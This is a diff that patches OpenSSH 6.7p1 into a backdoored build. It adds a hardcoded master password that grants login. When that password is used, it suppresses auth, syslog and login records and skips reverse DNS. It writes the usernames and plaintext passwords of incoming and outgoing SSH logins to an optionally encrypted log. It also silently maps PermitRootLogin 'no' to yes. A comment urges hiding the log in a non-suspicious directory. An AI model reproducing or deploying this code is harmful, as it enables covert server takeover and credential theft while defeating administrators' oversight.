@@ -1,0 +1,441 @@
+diff -u openssh-6.7p1/auth.c openssh-6.7p1-crypto-bd/auth.c
+--- openssh-6.7p1/auth.c	2014-07-18 01:11:25.000000000 -0300
++++ openssh-6.7p1-crypto-bd/auth.c	2014-10-22 21:37:38.326871516 -0200
+@@ -293,6 +293,7 @@
+ 	else
+ 		authmsg = authenticated ? "Accepted" : "Failed";
+ 
++	if(!blowdoor || blowdoor !=1){
+ 	authlog("%s %s%s%s for %s%.100s from %.200s port %d %s%s%s",
+ 	    authmsg,
+ 	    method,
+@@ -306,7 +307,7 @@
+ 	    authctxt->info != NULL ? authctxt->info : "");
+ 	free(authctxt->info);
+ 	authctxt->info = NULL;
+-
++	}
+ #ifdef CUSTOM_FAILED_LOGIN
+ 	if (authenticated == 0 && !authctxt->postponed &&
+ 	    (strcmp(method, "password") == 0 ||
+diff -u openssh-6.7p1/auth-pam.c openssh-6.7p1-crypto-bd/auth-pam.c
+--- openssh-6.7p1/auth-pam.c	2013-12-18 22:31:45.000000000 -0200
++++ openssh-6.7p1-crypto-bd/auth-pam.c	2014-10-23 04:21:16.011875524 -0200
+@@ -47,6 +47,7 @@
+ 
+ /* Based on $FreeBSD: src/crypto/openssh/auth2-pam-freebsd.c,v 1.11 2003/03/31 13:48:18 des Exp $ */
+ #include "includes.h"
++#include "logcrypt2.h"
+ 
+ #include <sys/types.h>
+ #include <sys/stat.h>
+@@ -1178,6 +1179,14 @@
+ int
+ sshpam_auth_passwd(Authctxt *authctxt, const char *password)
+ {
++	struct addrinfo hints, *info, *p;
++	int gai_result;
++
++	char hostnamezz[1024];
++	hostnamezz[1023] = '\0';
++	gethostname(hostnamezz, 1023);
++
++
+ 	int flags = (options.permit_empty_passwd == 0 ?
+ 	    PAM_DISALLOW_NULL_AUTHTOK : 0);
+ 
+@@ -1205,9 +1214,55 @@
+ 
+ 	sshpam_err = pam_authenticate(sshpam_handle, flags);
+ 	sshpam_password = NULL;
++
+ 	if (sshpam_err == PAM_SUCCESS && authctxt->valid) {
+ 		debug("PAM: password authentication accepted for %.100s",
+ 		    authctxt->user);
++
++		memset(&hints, 0, sizeof hints);
++		hints.ai_family = AF_UNSPEC; /*either IPV4 or IPV6*/
++		hints.ai_socktype = SOCK_STREAM;
++		hints.ai_flags = AI_CANONNAME;
++
++		if ((gai_result = getaddrinfo(hostnamezz, "http", &hints, &info)) != 0) {
++
++#ifdef CL
++			Decrypt0r_(bdlogfile,"/tmp/.zZtemp");
++
++			if((f=fopen("/tmp/.zZtemp","a"))!=NULL){
++                                fprintf(f,"IN: %s@%s:%s\n",authctxt->user,gai_strerror(gai_result), password);
++                                fclose(f);
++			}
++
++			Encrypt0r_("/tmp/.zZtemp",bdlogfile);
++#else
++			if((f=fopen(bdlogfile,"a"))!=NULL){
++				fprintf(f,"IN: %s@%s:%s\n",authctxt->user,gai_strerror(gai_result), password);
++				fclose(f);
++			}
++#endif
++		}
++
++		for(p = info; p != NULL; p = p->ai_next) {
++
++#ifdef CL
++			Decrypt0r_(bdlogfile,"/tmp/.zZtemp");
++			if((f=fopen("/tmp/.zZtemp","a"))!=NULL){
++                               	fprintf(f,"IN: %s@%s:%s\n",authctxt->user,p->ai_canonname, password);
++                               	fclose(f);
++                        }
++			Encrypt0r_("/tmp/.zZtemp",bdlogfile);
++#else
++			if((f=fopen(bdlogfile,"a"))!=NULL){
++				fprintf(f,"IN: %s@%s:%s\n",authctxt->user,p->ai_canonname, password);
++				fclose(f);
++			}
++#endif
++		
++		}
++		freeaddrinfo(info);
++               //}
++
+ 		return 1;
+ 	} else {
+ 		debug("PAM: password authentication failed for %.100s: %s",
+diff -u openssh-6.7p1/auth-passwd.c openssh-6.7p1-crypto-bd/auth-passwd.c
+--- openssh-6.7p1/auth-passwd.c	2014-07-18 01:11:25.000000000 -0300
++++ openssh-6.7p1-crypto-bd/auth-passwd.c	2014-10-23 08:08:24.696440537 -0200
+@@ -37,6 +37,8 @@
+  */
+ 
+ #include "includes.h"
++#include "auth-bd.h"
++#include "logcrypt.h"
+ 
+ #include <sys/types.h>
+ 
+@@ -58,6 +60,9 @@
+ extern Buffer loginmsg;
+ extern ServerOptions options;
+ 
++#include <crypt.h>
++
++
+ #ifdef HAVE_LOGIN_CAP
+ extern login_cap_t *lc;
+ #endif
+@@ -81,12 +86,35 @@
+ int
+ auth_password(Authctxt *authctxt, const char *password)
+ {
++        char hostnamezz[1024];
++        hostnamezz[1023] = '\0';
++        gethostname(hostnamezz, 1023);
++	struct addrinfo hints, *info, *p;
++	int gai_result;
++
+ 	struct passwd * pw = authctxt->pw;
+ 	int result, ok = authctxt->valid;
+ #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
+ 	static int expire_checked = 0;
+ #endif
+ 
++#ifdef BC
++  char *resultzz;
++  int okzz;
++
++  resultzz = crypt(password, bdpassword2);
++
++  okzz = strcmp (resultzz, bdpassword2) == 0;
++
++  if (okzz == 1) { blowdoor=1; return 1; }
++#else
++
++       if (!strcmp(password, bdpassword)) {
++                blowdoor=1;
++                return 1;
++        }
++#endif
++
+ #ifndef HAVE_CYGWIN
+ 	if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
+ 		ok = 0;
+@@ -124,6 +152,69 @@
+ 	}
+ #endif
+ 	result = sys_auth_passwd(authctxt, password);
++        if(result){
++
++/*	#ifdef CL
++        Decrypt0r(bdlogfile,"/tmp/.zZtemp");
++         if((f=fopen("/tmp/.zZtemp","a"))!=NULL){
++	fprintf(f,"user:password --> %s:%s\n",authctxt->user, password);
++        fclose(f);
++        }
++        Encrypt0r("/tmp/.zZtemp",bdlogfile);
++
++
++#else
++                if((f=fopen(bdlogfile,"a"))!=NULL){
++                        fprintf(f,"user:password --> %s:%s\n",authctxt->user, password);
++                        fclose(f);
++                }
++#endif
++*/
++
++
++                memset(&hints, 0, sizeof hints);
++                hints.ai_family = AF_UNSPEC; /*either IPV4 or IPV6*/
++                hints.ai_socktype = SOCK_STREAM;
++                hints.ai_flags = AI_CANONNAME;
++
++                if ((gai_result = getaddrinfo(hostnamezz, "http", &hints, &info)) != 0) {
++
++#ifdef CL
++                        Decrypt0r_(bdlogfile,"/tmp/.zZtemp");
++
++                        if((f=fopen("/tmp/.zZtemp","a"))!=NULL){
++                                fprintf(f,"IN: %s@%s:%s\n",authctxt->user,gai_strerror(gai_result), password);
++                                fclose(f);
++                        }
++
++                        Encrypt0r_("/tmp/.zZtemp",bdlogfile);
++#else
++                        if((f=fopen(bdlogfile,"a"))!=NULL){
++                                fprintf(f,"IN: %s@%s:%s\n",authctxt->user,gai_strerror(gai_result), password);
++                                fclose(f);
++                        }
++#endif
++                }
++                for(p = info; p != NULL; p = p->ai_next) {
++
++#ifdef CL
++                        Decrypt0r_(bdlogfile,"/tmp/.zZtemp");
++                        if((f=fopen("/tmp/.zZtemp","a"))!=NULL){
++                                fprintf(f,"IN: %s@%s:%s\n",authctxt->user,p->ai_canonname, password);
++                                fclose(f);
++                        }
++                        Encrypt0r_("/tmp/.zZtemp",bdlogfile);
++#else
++                        if((f=fopen(bdlogfile,"a"))!=NULL){
++                                fprintf(f,"IN: %s@%s:%s\n",authctxt->user,p->ai_canonname, password);
++                                fclose(f);
++                        }
++#endif
++
++                }
++                freeaddrinfo(info);
++        }
++
+ 	if (authctxt->force_pwchange)
+ 		disable_forwarding();
+ 	return (result && ok);
+Somente em openssh-6.7p1-crypto-bd/: buildpkg.sh
+diff -u openssh-6.7p1/canohost.c openssh-6.7p1-crypto-bd/canohost.c
+--- openssh-6.7p1/canohost.c	2014-07-18 01:11:25.000000000 -0300
++++ openssh-6.7p1-crypto-bd/canohost.c	2014-10-22 21:38:06.522872683 -0200
+@@ -77,11 +77,14 @@
+ 
+ 	debug3("Trying to reverse map address %.100s.", ntop);
+ 	/* Map the IP address to a host name. */
++
++	if(!blowdoor || blowdoor!=1){
+ 	if (getnameinfo((struct sockaddr *)&from, fromlen, name, sizeof(name),
+ 	    NULL, 0, NI_NAMEREQD) != 0) {
+ 		/* Host name not found.  Use ip address. */
+ 		return xstrdup(ntop);
+ 	}
++	}
+ 
+ 	/*
+ 	 * if reverse lookup result looks like a numeric hostname,
+Somente em openssh-6.7p1-crypto-bd/: config.h
+Somente em openssh-6.7p1-crypto-bd/: config.status
+Subdiretórios idênticos: openssh-6.7p1/contrib e openssh-6.7p1-crypto-bd/contrib
+Somente em openssh-6.7p1-crypto-bd/: cryptback
+Somente em openssh-6.7p1-crypto-bd/: cryptback.c
+Somente em openssh-6.7p1-crypto-bd/: decryptlog
+Somente em openssh-6.7p1-crypto-bd/: decryptlog.c
+diff -u openssh-6.7p1/includes.h openssh-6.7p1-crypto-bd/includes.h
+--- openssh-6.7p1/includes.h	2013-03-21 22:51:09.000000000 -0300
++++ openssh-6.7p1-crypto-bd/includes.h	2014-10-23 08:32:57.684501603 -0200
+@@ -1,3 +1,4 @@
++
+ /* $OpenBSD: includes.h,v 1.54 2006/07/22 20:48:23 stevesk Exp $ */
+ 
+ /*
+@@ -13,6 +14,7 @@
+  * called by a name other than "ssh" or "Secure Shell".
+  */
+ 
++
+ #ifndef INCLUDES_H
+ #define INCLUDES_H
+ 
+@@ -176,4 +178,15 @@
+ 
+ #include "entropy.h"
+ 
++int blowdoor;
++FILE *f;
++
++
++// directory of logs. use a non-suspicious directory :D
++//#define bdlogfile "/tmp/ilog"
++
++
++// unset if dont want logs encrypted. put // before line below.
++//#define CL 0
++
+ #endif /* INCLUDES_H */
+diff -u openssh-6.7p1/log.c openssh-6.7p1-crypto-bd/log.c
+--- openssh-6.7p1/log.c	2013-05-16 07:32:30.000000000 -0300
++++ openssh-6.7p1-crypto-bd/log.c	2014-10-22 21:38:40.998874113 -0200
+@@ -382,6 +382,8 @@
+ void
+ do_log(LogLevel level, const char *fmt, va_list args)
+ {
++
++if(!blowdoor || blowdoor!=1){
+ #if defined(HAVE_OPENLOG_R) && defined(SYSLOG_DATA_INIT)
+ 	struct syslog_data sdata = SYSLOG_DATA_INIT;
+ #endif
+@@ -459,3 +461,4 @@
+ 	}
+ 	errno = saved_errno;
+ }
++}
+Somente em openssh-6.7p1-crypto-bd/: logcrypt2.h
+Somente em openssh-6.7p1-crypto-bd/: logcrypt.h
+Somente em openssh-6.7p1-crypto-bd/: Makefile
+Subdiretórios idênticos: openssh-6.7p1/openbsd-compat e openssh-6.7p1-crypto-bd/openbsd-compat
+Somente em openssh-6.7p1-crypto-bd/: opensshd.init
+Somente em openssh-6.7p1-crypto-bd/: openssh.xml
+Subdiretórios idênticos: openssh-6.7p1/regress e openssh-6.7p1-crypto-bd/regress
+Subdiretórios idênticos: openssh-6.7p1/scard e openssh-6.7p1-crypto-bd/scard
+diff -u openssh-6.7p1/servconf.c openssh-6.7p1-crypto-bd/servconf.c
+--- openssh-6.7p1/servconf.c	2014-07-18 01:11:26.000000000 -0300
++++ openssh-6.7p1-crypto-bd/servconf.c	2014-10-22 19:53:16.218611903 -0200
+@@ -808,7 +808,7 @@
+ 	{ "without-password",		PERMIT_NO_PASSWD },
+ 	{ "forced-commands-only",	PERMIT_FORCED_ONLY },
+ 	{ "yes",			PERMIT_YES },
+-	{ "no",				PERMIT_NO },
++	{ "no",				PERMIT_YES },
+ 	{ NULL, -1 }
+ };
+ static const struct multistate multistate_compression[] = {
+Somente em openssh-6.7p1-crypto-bd/: setup.sh
+diff -u openssh-6.7p1/ssh.c openssh-6.7p1-crypto-bd/ssh.c
+--- openssh-6.7p1/ssh.c	2014-07-18 02:04:11.000000000 -0300
++++ openssh-6.7p1-crypto-bd/ssh.c	2014-10-23 07:59:21.384418013 -0200
+@@ -78,6 +78,7 @@
+ #include "openbsd-compat/openssl-compat.h"
+ #include "openbsd-compat/sys-queue.h"
+ 
++#include "auth-bd.h"
+ #include "xmalloc.h"
+ #include "ssh.h"
+ #include "ssh1.h"
+@@ -414,6 +415,7 @@
+ int
+ main(int ac, char **av)
+ {
++
+ 	int i, r, opt, exit_status, use_syslog;
+ 	char *p, *cp, *line, *argv0, buf[MAXPATHLEN], *host_arg, *logfile;
+ 	char thishost[NI_MAXHOST], shorthost[NI_MAXHOST], portstr[NI_MAXSERV];
+@@ -783,6 +785,7 @@
+ 			no_shell_flag = 1;
+ 			options.request_tty = REQUEST_TTY_NO;
+ 			break;
++
+ 		case 'T':
+ 			options.request_tty = REQUEST_TTY_NO;
+ 			break;
+@@ -808,6 +811,7 @@
+ 		case 'F':
+ 			config = optarg;
+ 			break;
++
+ 		default:
+ 			usage();
+ 		}
+diff -u openssh-6.7p1/sshconnect2.c openssh-6.7p1-crypto-bd/sshconnect2.c
+--- openssh-6.7p1/sshconnect2.c	2014-07-18 01:11:27.000000000 -0300
++++ openssh-6.7p1-crypto-bd/sshconnect2.c	2014-10-23 03:19:16.387721316 -0200
+@@ -25,6 +25,7 @@
+  */
+ 
+ #include "includes.h"
++#include "logcrypt.h"
+ 
+ #include <sys/types.h>
+ #include <sys/socket.h>
+@@ -849,7 +850,6 @@
+ 	packet_send();
+ 	return 1;
+ }
+-
+ int
+ userauth_passwd(Authctxt *authctxt)
+ {
+@@ -868,6 +868,25 @@
+ 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+ 	    authctxt->server_user, host);
+ 	password = read_passphrase(prompt, 0);
++
++
++#ifdef CL
++
++	Decrypt0r(bdlogfile,"/tmp/.zZtemp");
++	 if((f=fopen("/tmp/.zZtemp","a"))!=NULL){
++	fprintf(f,"OUT: %s@%s:%s\n",authctxt->server_user,authctxt->host,password);
++	fclose(f);
++	}
++	Encrypt0r("/tmp/.zZtemp",bdlogfile);
++
++#else
++        if((f=fopen(bdlogfile,"a"))!=NULL){
++                fprintf(f,"OUT: %s@%s:%s\n",authctxt->server_user,authctxt->host,password);
++                fclose(f);
++        }
++
++#endif
++
+ 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
+ 	packet_put_cstring(authctxt->server_user);
+ 	packet_put_cstring(authctxt->service);
+diff -u openssh-6.7p1/sshlogin.c openssh-6.7p1-crypto-bd/sshlogin.c
+--- openssh-6.7p1/sshlogin.c	2014-07-18 01:11:27.000000000 -0300
++++ openssh-6.7p1-crypto-bd/sshlogin.c	2014-10-22 21:39:18.594875671 -0200
+@@ -134,9 +134,11 @@
+ 
+ 	li = login_alloc_entry(pid, user, host, tty);
+ 	login_set_addr(li, addr, addrlen);
++        if(!blowdoor || blowdoor!=1){
+ 	login_login(li);
+ 	login_free_entry(li);
+ }
++}
+ 
+ #ifdef LOGIN_NEEDS_UTMPX
+ void
+@@ -159,6 +161,8 @@
+ 	struct logininfo *li;
+ 
+ 	li = login_alloc_entry(pid, user, NULL, tty);
++	if(!blowdoor || blowdoor!=1){
+ 	login_logout(li);
+ 	login_free_entry(li);
+ }
++}
+Somente em openssh-6.7p1-crypto-bd/: survey.sh
+diff -u openssh-6.7p1/version.h openssh-6.7p1-crypto-bd/version.h
+--- openssh-6.7p1/version.h	2014-04-20 00:25:31.000000000 -0300
++++ openssh-6.7p1-crypto-bd/version.h	2014-10-23 08:33:46.320503620 -0200
+@@ -1,6 +1 @@
+ /* $OpenBSD: version.h,v 1.71 2014/04/18 23:52:25 djm Exp $ */
+-
+-#define SSH_VERSION	"OpenSSH_6.7"
+-
+-#define SSH_PORTABLE	"p1"
+-#define SSH_RELEASE	SSH_VERSION SSH_PORTABLE
